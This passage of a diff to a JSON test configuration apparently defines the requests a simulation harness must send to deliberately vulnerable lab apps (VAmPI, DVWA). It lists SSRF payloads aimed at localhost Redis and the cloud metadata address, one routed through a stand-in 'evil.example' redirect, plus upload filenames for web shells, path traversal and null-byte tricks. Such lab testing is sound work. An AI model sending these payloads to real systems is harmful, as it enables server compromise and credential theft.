+            "payload_class": "ssrf-redirect",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "url": "http://evil.example/redirect?to=http://127.0.0.1:6379/"
+            }
+          },
+          {
+            "id": "json-0",
+            "method": "POST",
+            "path": "/vampi/users/v1/_debug",
+            "payload_class": "ssrf-json",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"url\":\"http://127.0.0.1/\"}",
+            "headers": {
+              "content-type": "application/json"
+            }
+          },
+          {
+            "id": "json-1",
+            "method": "POST",
+            "path": "/vampi/users/v1/_debug",
+            "payload_class": "ssrf-json",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"url\":\"http://169.254.169.254/latest/meta-data/\"}",
+            "headers": {
+              "content-type": "application/json"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "web-app-attacks/09-csrf",
@@ -10856,7 +11902,99 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "upload-0",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/upload/",
+            "payload_class": "multipart-upload",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"avatar\\.jpg\"",
+            "header_regex": {
+              "content-type": "multipart/form-data; boundary=.+"
+            }
+          },
+          {
+            "id": "upload-1",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/upload/",
+            "payload_class": "multipart-upload",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"shell\\.php\\.jpg\"",
+            "header_regex": {
+              "content-type": "multipart/form-data; boundary=.+"
+            }
+          },
+          {
+            "id": "upload-2",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/upload/",
+            "payload_class": "multipart-upload",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"webshell\\.php\"",
+            "header_regex": {
+              "content-type": "multipart/form-data; boundary=.+"
+            }
+          },
+          {
+            "id": "upload-3",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/upload/",
+            "payload_class": "multipart-upload",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"bigfile\\.bin\"",
+            "header_regex": {
+              "content-type": "multipart/form-data; boundary=.+"
+            }
+          },
+          {
+            "id": "upload-4",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/upload/",
+            "payload_class": "multipart-upload",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"image\\.svg\"",
+            "header_regex": {
+              "content-type": "multipart/form-data; boundary=.+"
+            }
+          },
+          {
+            "id": "upload-5",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/upload/",
+            "payload_class": "multipart-upload",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"page\\.html\"",
+            "header_regex": {
+              "content-type": "multipart/form-data; boundary=.+"
+            }
+          },
+          {
+            "id": "upload-6",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/upload/",
+            "payload_class": "multipart-upload",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"\\.\\./\\.\\./shell\\.php\"",
+            "header_regex": {
+              "content-type": "multipart/form-data; boundary=.+"
+            }
+          },
+          {
+            "id": "upload-7",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/upload/",
+            "payload_class": "multipart-upload",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"shell\\.php%00\\.jpg\"",
+            "header_regex": {
+              "content-type": "multipart/form-data; boundary=.+"
+            }
+          }
+        ]
+      }
     }
   ],
   "required_assets": [
